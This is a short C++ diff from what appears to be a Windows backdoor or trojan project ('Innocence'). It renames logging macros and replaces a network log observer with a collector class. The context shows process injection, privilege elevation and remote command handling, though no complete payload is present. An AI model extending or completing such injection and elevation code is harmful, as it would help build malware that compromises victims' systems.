@@ -26,7 +26,7 @@ void Inject(InhibiterCore& injector, const string& inhibitorPath);
 
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {	
-    FUNC_LOG(__FUNCTION__);
+    TRACE_FUNCTION
 	System::Process::This thisProcess;
 
 #ifdef INNOCENCE_DEBUG
@@ -37,7 +37,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     // caractere avec un certain format située dans l'exécutable
 	// on va parser les infos de connexions à partir de la chaine
     
-	LOG.addObserver(new Common::LogToNetwork("127.0.0.1", 80));
+	LOG.addObserver(new Common::LogToCollector);
 #endif
 
     InhibiterCore injector (thisProcess.getProgramPath());
@@ -66,7 +66,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
 
 void ExecuteCommand(InhibiterCore& injector, const string& command)
 {
-    FUNC_LOG(__FUNCTION__);
+    TRACE_FUNCTION
 	if(command == Innocence::UNINSTALL_CMD)
     {
 		LOG << "Uninstall command";
@@ -118,7 +118,7 @@ void ExecuteCommand(InhibiterCore& injector, const string& command)
 
 void Inject(InhibiterCore& injector, const string& inhibitorPath)
 {
-    FUNC_LOG(__FUNCTION__);
+    TRACE_FUNCTION
 	if(!isAdministrator())
 	{
 		if(elevate(inhibitorPath) == EXIT_SUCCESS)
